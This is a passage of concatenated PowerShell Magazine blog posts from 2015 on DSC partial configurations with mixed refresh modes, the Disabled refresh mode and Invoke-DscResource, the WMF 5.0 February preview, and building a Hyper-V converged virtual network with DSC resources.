LCM settings. This configuration script assumes that you have OS setup files available at D: and SQL setup files at E:.\nHere is how the LCM meta-configuration of the target system looks for this scenario.\n[DSCLocalConfigurationManager()] configuration PartialConfigDemo { Node WMF5-2 { Settings { RefreshMode = \u0026#39;Pull\u0026#39; ConfigurationID = \u0026#39;a5f86baf-f17f-4778-8944-9cc99ec9f992\u0026#39; RebootNodeIfNeeded = $true } ConfigurationRepositoryShare SMBPull { SourcePath = \u0026#39;\\\\WMF5-1\\SMBPull\u0026#39; Name = \u0026#39;SMBPull\u0026#39; } PartialConfiguration OSConfig { Description = \u0026#39;Configuration for the Base OS\u0026#39; ConfigurationSource = \u0026#39;[ConfigurationRepositoryShare]SMBPull\u0026#39; RefreshMode = \u0026#39;Pull\u0026#39; } PartialConfiguration SQLConfig { Description = \u0026#39;Configuration for the SQL Server\u0026#39; DependsOn = \u0026#39;[PartialConfiguration]OSConfig\u0026#39; RefreshMode = \u0026#39;Push\u0026#39; } } } PartialConfigDemo As you see in this meta-configuration document, I have set the LCM RefreshMode to Pull. This is the global setting for LCM in general. For each partial configuration I have a RefreshMode setting again. For the OSConfig partial configuration, it is set to Push and Pull for the SQLConfig fragment. Remember that the ConfigurationSource setting within the partial configuration is mandatory if the RefreshMode for that partial configuration is set to Pull. Otherwise, you don’t need ConfigurationSource setting.\nEnacting configuration with mixed refresh modes When all partial configurations are set to Pull refresh mode, the configuration gets enacted during a consistency check or by calling the Update-DscConfiguration cmdlet. However, this process is a bit different when using mixed refresh modes. In our scenario, when we the consistency check kicks in or the Update-DscConfiguration is called, LCM finds that SQL configuration can be pulled over but it depends on OS configuration fragment that is set to push. The SQL configuration fragment cannot be enacted unless the OS configuration is complete. If we try to push the OS configuration fragment using the Start-DscConfiguration cmdlet, you will see an error that partial configurations cannot be pushed this way. Instead, you have to first publish the OS configuration fragment to the partial configuration store using the Publish-DscConfiguration cmdlet.\nPublish-DscConfiguration -ComputerName WMF5-2 -Path C:\\SMBPull -Verbose -Force When this step is complete, the published configuration can be enacted by specifying the -UseExisting switch parameter with the Start-DscConfiguration cmdlet.\nStart-DscConfiguration -ComputerName WMF5-2 -Verbose -Wait -UseExisting The above screenshot shows the output of the enact process. If you observe closely, DSC tries to get the remaining partial fragments from the Pull server. Since an updated fragment already exists on my system, it is not pulled again.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/20/mixed-refresh-mode-support-for-dsc-partial-configurations/","tags":["PowerShell DSC"],"title":"Mixed refresh mode support for DSC partial configurations"},{"categories":["PowerShell DSC"],"contents":"In the WMF 5.0 Preview February release, a new DSC RefreshMode setting is added to the LCM meta-configuration. If you have worked with first release of DSC or any of the earlier WMF 5.0 Previews, you will know that there were two refresh modes possible \u0026ndash; Push and Pull. These are the configuration delivery modes and define how the configuration gets delivered to the target node. Configuration delivery essentially means how the configuration MOF document is sent to the target node and what happens thereafter. Once a configuration MOF document is available on the target node as pending.mof, it gets enacted and gets stored as current.mof, if everything goes well.\nPush is the default configuration delivery mode and an administrator can push and enact target node configuration using the Start-DscConfiguration cmdlet. When you have hundreds if not thousands of target nodes, this method isn\u0026rsquo;t scalable. Also, when using Push mode, there is no way we can automatically deliver the missing resource modules to the target nodes.\nPull mode enables a more centralized way of delivery configuration and resource modules to target nodes. You can either deploy the DSC service feature and configure a REST-based endpoint for pull mode or use a simple SMB file share to stage configuration documents and resource modules. In WMF 5.0, it is possible for a target node to get a subset of configuration from a REST-based pull service and the remaining from a SMB file share.\nWith February preview release, you can also mix Push and Pull mode of configuration delivery on the same target node when using the partial configurations feature. More on this later.\nThere is an additional RefreshMode setting available starting with the February preview. This setting is called \u0026lsquo;Disabled\u0026rsquo;. What it does? As you may have correctly guessed, it disables any kind of document processing. We can use the Set-DscLocalConfigurationManager to set RefreshMode to Disabled.\n[DscLocalConfigurationManager()] Configuration Meta { Node WMF5-2 { Settings { RefreshMode = \u0026#34;Disabled\u0026#34; } } } Meta $CimSession = New-CimSession -ComputerName WMF5-2 Set-DscLocalConfigurationManager -Path .\\Meta -CimSession $CimSession Get-DscLocalConfigurationManager -CimSession $CimSession Remove-CimSession -CimSession $CimSession This will disable any configuration document processing on the target node.\nWhen the RefreshMode is set to Disabled, you can\u0026rsquo;t push the configuration using the Start-DscConfiguration cmdlet which makes perfect sense.\nConfiguration DemoRefreshMode { Node WMF5-2 { File DemoFile { DestinationPath = \u0026#39;C:\\DemoRefreshMode\u0026#39; Type = \u0026#39;Directory\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } } DemoRefreshMode Start-DscConfiguration -ComputerName WMF5-2 -Path .\\DemoRefreshMode -Verbose -Wait You cannot force the push mode using -Force switch parameter on the Start-DscConfiguration cmdlet. So, why do we need something like this?\nRemember, DSC is not just a configuration management toolset. It is a configuration management platform. The already popular configuration management tools such as Chef, Puppet, and others are expected to leverage DSC for configuration management on Windows OS. When you have a 3rd party equivalent of LCM sitting on the same system managing configuration based on its own policies, you don’t want LCM to come in its way and start doing consistency checks on a periodic basis. That does not make sense. Disabling any document processing by setting LCM RefreshMode is the right way here. If we cannot use Push or Pull methods, how the 3rd party configuration managers are supposed to use DSC to enact resource configuration?\nFor this purpose, a new cmdlet called Invoke-DscResource is introduced in the February preview. This cmdlet is supported only when the RefreshMode is set to Disabled.\nThis cmdlet takes three mandatory parameters.\nName of the DSC resource.\nMethod within the DSC resource that needs to be invoked.\nProperty hash table that needs to be passed to the resource method being called.\nThe Module parameter is optional and can be used to specify the name of the module for the DSC resource.\nHow DSC uses a resource methods? It first runs the Test-TargetResource function to see if the resource is already in desired state. If not, it runs the Set-TargetResource function. The Get-TargetResource is used only when you run the Get-DscConfiguration cmdlet. Any 3rd party configuration manager trying to use DSC for Windows OS configuration management should ideally use the same workflow.\nIn the scenario that I showed in the configuration script at the beginning, I first need to test if the folder already exists on the target system.\n$Params = @{ Name = \u0026#39;File\u0026#39; Property = @{\u0026#39;DestinationPath\u0026#39;=\u0026#39;C:\\DemoRefreshMode\u0026#39;; Type = \u0026#39;Directory\u0026#39;; Ensure = \u0026#39;Present\u0026#39;} Verbose = $true } $TestResult = Invoke-DscResource @Params -Method Test If (-not $testResult.InDesiredState) { Invoke-DscResource -Method Set @Params } In the verbose output, we see ‘DirectResourceAccess’ as the configuration name. Since we don’t have a configuration document where a configuration name is defined, DSC internally adds ‘DirectResourceAccess’ as the configuration name and calls the CIM method. There is no way to target this cmdlet to a remote system. There is no -ComputerName or -CimSession parameter which means the cmdlet needs to be executed either locally on a target system or use the Invoke-Command cmdlet.\n$ScriptBlock = { $Params = @{ Name = \u0026#39;File\u0026#39; Property = @{\u0026#39;DestinationPath\u0026#39;=\u0026#39;C:\\DemoRefreshMode\u0026#39;; Type = \u0026#39;Directory\u0026#39;; Ensure = \u0026#39;Present\u0026#39;} Verbose = $true } $TestResult = Invoke-DscResource @Params -Method Test If (-not $testResult.InDesiredState) { Invoke-DscResource -Method Set @Params } } Invoke-Command -ComputerName WMF5-2 -ScriptBlock $ScriptBlock This requires PowerShell remoting. In case, you do not have PowerShell remoting enabled, you can directly call the CIM method in the PSDesiredStateConfiguration namespace. The MSFT_DscLocalConfigurationManager class contains three new methods \u0026ndash; ResourceGet, ResourceSet, and ResourceTest. These three methods can be invoked over a CIM session to perform the same task as the Invoke-DscResource cmdlet.\nThese CIM methods require more explanation and I will talk about it in a separate article. Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/19/dsc-local-configuration-manager-refresh-modes-in-wmf-5-0/","tags":["PowerShell DSC"],"title":"DSC Local Configuration Manager Refresh Modes in WMF 5.0"},{"categories":["News"],"contents":"Windows PowerShell team announced the availability of Windows Management Framework (WMF) 5.0 Preview February 2015. This preview is available for Windows 8.1, Windows Server 2012 R2, and Windows Server 2012.\nAs announced earlier, this WMF release continues to include both stable and experimental features. I mean a lot of them! 🙂\n   Scenario Design Status     Develop DSC resources with classes in Windows PowerShell Stable   Remove DSC documents delivered to a system Stable   Support for inheritance with classes in Windows PowerShell Experimental   DSC resource script debugging Experimental   Support for new RefreshMode Experimental   Partial configurations support mixed RefreshModes Experimental   PSScriptAnalyzer: static code analysis of Windows PowerShell artifacts Experimental   32-bit support for the configuration keyword in DSC Stable   Generate Windows PowerShell cmdlets based on an OData endpoint with ODataUtils Stable   Manage .ZIP archives through new cmdlets Stable   Audit Windows PowerShell usage by transcription and logging Stable   Interact with symbolic links using improved Item cmdlets Stable   Network Switch management with Windows PowerShell Stable   DSC authoring improvements in Windows PowerShell ISE Stable    From a DSC point of view, there are many improvements.\nClass-defined DSC resource authoring is improved and there are subtle changes that are required for the old class-defined resource, if you built any.\nA new RefreshMode in DSC called disabled lets 3rd party configuration managers such as Chef manage a node configuration using their own agent or using the Invoke-DscResource cmdlet which means we would be able to do this directly using the CIM method as well. More on this later.\nPartial configurations now support mixed refresh modes including Push and Disabled. Partial configurations are great way to enable delegated configuration authoring and management.\nDSC resource script debugging is a great addition and my subsequent posts will talk about this.\nGo ahead and start exploring WMF 5.0.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/18/windows-management-framework-5-0-february-preview-available/","tags":["News"],"title":"Windows Management Framework 5.0 February preview available"},{"categories":["PowerShell DSC"],"contents":"In an earlier article, I had introduced DSC resources that can be used to deploy a Hyper-V converged virtual network. In this series of articles, we will build the converged network configuration for what is shown below.\nHere is a recap of configuration needed.\n Create a host network team. Create a VM switch using the host team. Create host VM adapters in the management OS to connect to the VM switch and assign VLANs and bandwidth settings. Assign IP addresses and DNS addresses, as required (today’s article)  In the earlier articles, we created a network team named HostTeam, deployed a VM switch using that network team, and finally created a few VM network adapters and configured bandwidth and VLAN settings on them. In today’s article, we will see how to assign IP addresses to these virtual network adapters.\nTo complete this task, we need the xIPAddress and xDnsServerAddress DSC resources from the xNetworking module in the DSC resource kit.\nIn the scenario that we are working on, we need static IP addresses assigned to each of the adapters in the management OS. Also, the host management adapter requires DNS server address so that we can use that network connection to Active Directory and other infrastructure services.\nHere is the configuration that I pushed to the Hyper-V server to configure IP addresses for each of the network adapters in the management OS.\nxIPAddress MgmtAddress { IPAddress = \u0026#34;100.194.14.114\u0026#34; InterfaceAlias = \u0026#34;vEthernet (HostSwitch)\u0026#34; SubnetMask = 23 DefaultGateway = \u0026#39;100.194.14.1\u0026#39; AddressFamily = \u0026#34;IPV4\u0026#34; } xDNSServerAddress MgmtDNS { InterfaceAlias = \u0026#39;vEthernet (HostSwitch)\u0026#39; Address = \u0026#39;100.194.14.87\u0026#39; AddressFamily = \u0026#39;IPV4\u0026#39; } xIPAddress ClusterAddress { IPAddress = \u0026#34;172.168.1.114\u0026#34; InterfaceAlias = \u0026#34;vEthernet (HostCluster)\u0026#34; SubnetMask = 16 AddressFamily = \u0026#34;IPV4\u0026#34; } xIPAddress LMAddress { IPAddress = \u0026#34;192.168.1.114\u0026#34; InterfaceAlias = \u0026#34;vEthernet (HostLiveMigration)\u0026#34; SubnetMask = 24 AddressFamily = \u0026#34;IPV4\u0026#34; } This completes the configuration of IP addresses and DNS addresses for the network adapters. The host management adapter needs the gateway and DNS server addresses. We don’t have to configure those settings for the cluster and live migration networks.\nMake note of the value provided for the InterfaceAlias property. This is not just the network adapter name we used so far but the name of the adapter as you see in network connections. For example, vEthernet (HostSwitch) should be the interface alias for the HostSwitch adapter.\nThe following snippet provides the complete resource configuration for creating Hyper-V converged virtual network.\nConfiguration DemoNetworkTeam { Import-DscResource -Module cWindowsOS -Name cNetworkTeam Import-DscResource -Module cHyper-V -Name cVMSwitch, cVMNetworkAdapter, cVMNetworkAdapterSettings, cVMNetworkAdapterVlan Import-DscResource -Module xNetworking -Name MSFT_xIPAddress, MSFT_xDNSServerAddress Node Localhost { cNetworkTeam NetworkTeam { Name = \u0026#39;HostTeam\u0026#39; TeamingMode = \u0026#39;SwitchIndependent\u0026#39; LoadBalancingAlgorithm = \u0026#39;HyperVPort\u0026#39; TeamMembers = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; Ensure = \u0026#39;Present\u0026#39; } cVMSwitch HostSwitch { Name = \u0026#39;HostSwitch\u0026#39; Type = \u0026#39;External\u0026#39; AllowManagementOS = $true MinimumBandwidthMode = \u0026#39;Weight\u0026#39; NetAdapterName = \u0026#39;HostTeam\u0026#39; Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cNetworkTeam]NetworkTeam\u0026#39; } cVMNetworkAdapterSettings HostSwitchSettings { Name = \u0026#39;HostSwitch\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterVlan HostSwitchVlan { Name = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapter HostCluster { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterSettings HostClusterSettings { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 20 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostCluster\u0026#39; } cVMNetworkAdapterVlan HostClusterVlan { Name = \u0026#39;HostCluster\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 20 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostCluster\u0026#39; } cVMNetworkAdapter HostLiveMigration { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterSettings HostLiveMigrationSettings { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 30 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostLiveMigration\u0026#39; } cVMNetworkAdapterVlan HostLiveMigrationVlan { Name = \u0026#39;HostLiveMigration\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 30 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostLiveMigration\u0026#39; } xIPAddress MgmtAddress { IPAddress = \u0026#34;100.194.14.114\u0026#34; InterfaceAlias = \u0026#34;vEthernet (HostSwitch)\u0026#34; SubnetMask = 23 DefaultGateway = \u0026#39;100.194.14.1\u0026#39; AddressFamily = \u0026#34;IPV4\u0026#34; } xDNSServerAddress MgmtDNS { InterfaceAlias = \u0026#39;vEthernet (HostSwitch)\u0026#39; Address = \u0026#39;100.194.14.87\u0026#39; AddressFamily = \u0026#39;IPV4\u0026#39; } xIPAddress ClusterAddress { IPAddress = \u0026#34;172.168.1.114\u0026#34; InterfaceAlias = \u0026#34;vEthernet (HostCluster)\u0026#34; SubnetMask = 16 AddressFamily = \u0026#34;IPV4\u0026#34; } xIPAddress LMAddress { IPAddress = \u0026#34;192.168.1.114\u0026#34; InterfaceAlias = \u0026#34;vEthernet (HostLiveMigration)\u0026#34; SubnetMask = 24 AddressFamily = \u0026#34;IPV4\u0026#34; } } } DemoNetworkTeam This brings us to the end of this series of articles on using DSC for creating Hyper-V converged virtual network. If you have any feedback or see any issues with the DSC resource modules, feel free to create a discussion or issue on Github. I will be more than happy to help you and make these resource modules better.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/23/using-dsc-to-deploy-hyper-v-converged-virtual-network-assigning-ip-addresses-to-vm-adapters-final-part/","tags":["PowerShell DSC"],"title":"Using DSC to deploy Hyper-V converged virtual network – Assigning IP addresses to VM Adapters (Final Part)"},{"categories":["PowerShell DSC"],"contents":"In an earlier article, I had introduced DSC resources that can be used to deploy a Hyper-V converged virtual network. In this series of articles, we will build the converged network configuration for what is shown below.\nHere is a recap of configuration needed.\n Create a host network team. Create a VM switch using the host team. Create host VM adapters in the management OS to connect to the VM switch and assign VLANs and bandwidth settings (today’s article). Assign IP addresses and DNS addresses, as required.  In the earlier article, we created a network team named HostTeam and deployed a VM switch using that network team. In today’s article, we will see how to create virtual network adapters that are required for the Hyper-V cluster.\nCreating VM Network adapters using cVMNetworkAdapter DSC resource If you have not downloaded the new DSC resource modules yet, you can do so from my Github repo or using the Install-Module cmdlet in WMF 5.0. To create a converged virtual switch, we will need the cVMNetworkAdapter resource from the cHyper-V module. The cVMNetworkAdapter can be used to create VM network adapters either in the management OS or connect network adapters to VMs.\nIn this resource properties, the Name represents the name of VM network adapter. The SwitchName property represents the name of the virtual switch this VM network adapter should be connected to. Apart from these two mandatory properties, the ManagementOS property is a mandatory property as well. If you are connecting to the VM adapter to the management OS, set this property to $true. If you are configuring the VM network adapter for a virtual machine, you must set the ManagementOS property to $false and use the VMName property to specify the name of the VM to which the adapter needs to connect.\nBy default, the VM network gets a dynamic MAC address gets assigned to it. If you need to set a static MAC address, you can use the StaticMacAddress property. Here is an example configuration.\ncVMNetworkAdapter VMNetDemo { Name = \u0026#39;NetDemo\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } Now, coming back to the converged virtual network configuration, we need to have three network adapters in the management OS – Management, Cluster, and LiveMigration. In the last article, I showed you how to create the VM switch using cVMSwitch resource. Since we have set AllowManagementOS to $true, the VM switch creation also creates a network adapter in the management OS with the same name as VM switch. So, we don’t have to create another adapter for management purpose. We can use the adapter that is created along with the VM switch for all management related traffic. That leaves us with two more adapters – Cluster and Live Migration. Here is the complete configuration that I am using to create a host team, VM switch, and finally the VM network adapters.\nConfiguration DemoNetworkTeam { Import-DscResource -Module cWindowsOS -Name cNetworkTeam Import-DscResource -Module cHyper-V -Name cVMSwitch, cVMNetworkAdapter Node Localhost { cNetworkTeam NetworkTeam { Name = \u0026#39;HostTeam\u0026#39; TeamingMode = \u0026#39;SwitchIndependent\u0026#39; LoadBalancingAlgorithm = \u0026#39;HyperVPort\u0026#39; TeamMembers = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; Ensure = \u0026#39;Present\u0026#39; } cVMSwitch HostSwitch { Name = \u0026#39;HostSwitch\u0026#39; Type = \u0026#39;External\u0026#39; AllowManagementOS = $true MinimumBandwidthMode = \u0026#39;Weight\u0026#39; NetAdapterName = \u0026#39;HostTeam\u0026#39; Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cNetworkTeam]NetworkTeam\u0026#39; } cVMNetworkAdapter HostCluster { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapter HostLiveMigration { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } } } DemoNetworkTeam This will create two more network adapters in the management OS and attach them to the HostSwitch that we configured earlier.\nConfiguring Bandwidth settings Once the management adapters are created, we can assign the bandwidth reservation or priority settings as needed. Since we set the MinimumBandwidthMode to Weight during VM switch creation, we need to specify the percentage of bandwidth reservation for each adapter. We use cVMNetworkAdapterSettings DSC resource for this purpose. This DSC resource can used for many other settings such as DhcpGuard, RouterGuard and so on.\nThere are three mandatory properties similar to the cVMNetworkAdapter DSC resource. You must specify the Name, SwitchName, and ManagementOS properties.\nThe MaximumBandwidth property is used to specify the maximum bandwidth, in bits per second, for the virtual network adapter. The MinimumBandwidthAbsolute specifies the minimum bandwidth, in bits per second, for the virtual network adapter. By default, these properties are set to zero which means those parameters within the network adapter are disabled. The _MinimumBandwidthWeight _specifies the minimum bandwidth, in terms of relative weight, for the virtual network adapter. The weight describes how much bandwidth to provide to the virtual network adapter relative to other virtual network adapters connected to the same virtual switch.\nIf you want allow teaming of network adapters in the guest OS, you can set the AllowTeaming property to On. By default, this is set to Off and therefore disallows network teaming inside guest OS. Similar to this, there are other settings of a VM network adapter that you can configure. These properties include DhcpGuard, MacAddressSpoofing, PortMirroring, RouterGuard, IeeePriorityTag, and VmqWeight. These properties are self explanatory and are left to defaults for a VM network adapter.\nFor now, we will limit our discussion only to bandwidth settings. Here is a sample configuration using this resource.\ncVMNetworkAdapterSettings HostClusterSettings { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostCluster\u0026#39; } As shown in the converged network diagram at the beginning, I am giving bandwidth weight of 10, 20, and 30 to HostSwitch, HostCluster, and HostLiveMigration adapters respectively. So, for my scenario, here is the configuration script that creates a host team, VM switch, VM network adapters in the management OS, and finally configures the bandwidth settings for each adapter.\nConfiguration DemoNetworkTeam { Import-DscResource -Module cWindowsOS -Name cNetworkTeam Import-DscResource -Module cHyper-V -Name cVMSwitch, cVMNetworkAdapter, cVMNetworkAdapterSettings Node Localhost { cNetworkTeam NetworkTeam { Name = \u0026#39;HostTeam\u0026#39; TeamingMode = \u0026#39;SwitchIndependent\u0026#39; LoadBalancingAlgorithm = \u0026#39;HyperVPort\u0026#39; TeamMembers = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; Ensure = \u0026#39;Present\u0026#39; } cVMSwitch HostSwitch { Name = \u0026#39;HostSwitch\u0026#39; Type = \u0026#39;External\u0026#39; AllowManagementOS = $true MinimumBandwidthMode = \u0026#39;Weight\u0026#39; NetAdapterName = \u0026#39;HostTeam\u0026#39; Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cNetworkTeam]NetworkTeam\u0026#39; } cVMNetworkAdapterSettings HostSwitchSettings { Name = \u0026#39;HostSwitch\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapter HostCluster { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterSettings HostClusterSettings { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 20 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostCluster\u0026#39; } cVMNetworkAdapter HostLiveMigration { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterSettings HostLiveMigrationSettings { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 30 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostLiveMigration\u0026#39; } } } DemoNetworkTeam After we apply this configuration, we can verify the bandwidth settings using the Get-VMNetworkAdapter cmdlet.\nGet-VMNetworkAdapter -ManagementOS | Select Name, @{Label = \u0026#39;MinimumBandwidthWeight\u0026#39;; Expression={$_.BandwidthSetting.MinimumBandwidthWeight}} | ft -AutoSize Configuring VLAN settings In a production environment, when using converged network configuration, you should not mix different types of traffic originating from host and virtual machines. This configuration on the network adapters can be done using the cNetworkAdapterVlan DSC resource.\nWhen configuring the VLAN settings for a VM network adapter, you must specify the Name of the adapter and whether that belongs to ManagementOS or not. If the VM adapter belongs to a VM, you should set the ManagementOS property to $false and specify a VM name using the VMName property. The AdapterMode property specifies the operation mode of the adapter and is by default set to Untagged which means there is not VLAN configuration. The possible and valid values for this property are Untagged, Access, Trunk, Community, Isolated, and _Promiscuous. _Each of these modes have a corresponding VLAN property that is mandatory. For example, if you set the AdapterMode property to Access, then it is mandatory to provide VlanId property. Similarly, if you set the AdapterMode to Trunk, the NativeVlanId property must be specified. The following table describes the properties that must be set and the optional properties for each operating mode.\n   AdapterMode Mandatory Property Optional Property     Untagged – –   Access VlanId –   Trunk NativeVlanId AllowedVlanIdList   Community PrimaryVlanId SecondaryVlanId   Isolated PrimaryVlanId SecondaryVlanId   Promiscuous PrimaryVlanId SecondaryVlanIdList    Here is a sample configuration script that shows cNetworkAdapterVlan resource in action.\ncVMNetworkAdapterVlan HostSwitchVlan { Name = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } In the scenario that I am building I have to configure VLAN 10, 20, and 30 for the HostSwitch, HostCluster, and HostLiveMigration adapters respectively. Let us see the complete configuration script now.\nConfiguration DemoNetworkTeam { Import-DscResource -Module cWindowsOS -Name cNetworkTeam Import-DscResource -Module cHyper-V -Name cVMSwitch, cVMNetworkAdapter, cVMNetworkAdapterSettings, cVMNetworkAdapterVlan Node Localhost { cNetworkTeam NetworkTeam { Name = \u0026#39;HostTeam\u0026#39; TeamingMode = \u0026#39;SwitchIndependent\u0026#39; LoadBalancingAlgorithm = \u0026#39;HyperVPort\u0026#39; TeamMembers = \u0026#39;NIC1\u0026#39;,\u0026#39;NIC2\u0026#39; Ensure = \u0026#39;Present\u0026#39; } cVMSwitch HostSwitch { Name = \u0026#39;HostSwitch\u0026#39; Type = \u0026#39;External\u0026#39; AllowManagementOS = $true MinimumBandwidthMode = \u0026#39;Weight\u0026#39; NetAdapterName = \u0026#39;HostTeam\u0026#39; Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cNetworkTeam]NetworkTeam\u0026#39; } cVMNetworkAdapterSettings HostSwitchSettings { Name = \u0026#39;HostSwitch\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterVlan HostSwitchVlan { Name = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 10 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapter HostCluster { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterSettings HostClusterSettings { Name = \u0026#39;HostCluster\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 20 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostCluster\u0026#39; } cVMNetworkAdapterVlan HostClusterVlan { Name = \u0026#39;HostCluster\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 20 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostCluster\u0026#39; } cVMNetworkAdapter HostLiveMigration { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39; } cVMNetworkAdapterSettings HostLiveMigrationSettings { Name = \u0026#39;HostLiveMigration\u0026#39; SwitchName = \u0026#39;HostSwitch\u0026#39; ManagementOS = $true MinimumBandwidthWeight = 30 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostLiveMigration\u0026#39; } cVMNetworkAdapterVlan HostLiveMigrationVlan { Name = \u0026#39;HostLiveMigration\u0026#39; ManagementOS = $true AdapterMode = \u0026#39;Access\u0026#39; VlanId = 30 DependsOn = \u0026#39;[cVMSwitch]HostSwitch\u0026#39;,\u0026#39;[cVMNetworkAdapter]HostLiveMigration\u0026#39; } } } DemoNetworkTeam Once we apply this configuration, it completes the creation of converged virtual network. The VLAN settings can be verified using the Get-VMNetworkAdapterVlan cmdlet.\nGet-VMNetworkAdapterVlan -ManagementOS This brings us to the end of today’s article. Tomorrow, we will see how we can assign IP address configuration to the VM adapters we created in this converged virtual network.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/01/22/using-dsc-to-deploy-hyper-v-converged-virtual-network-configuring-host-vm-adapters-part-3/","tags":["PowerShell DSC"],"title":"Using DSC to deploy Hyper-V converged virtual network – Configuring Host VM Adapters (Part 3)"},{"categories":["PowerShell DSC"],"contents":"In an earlier article, I 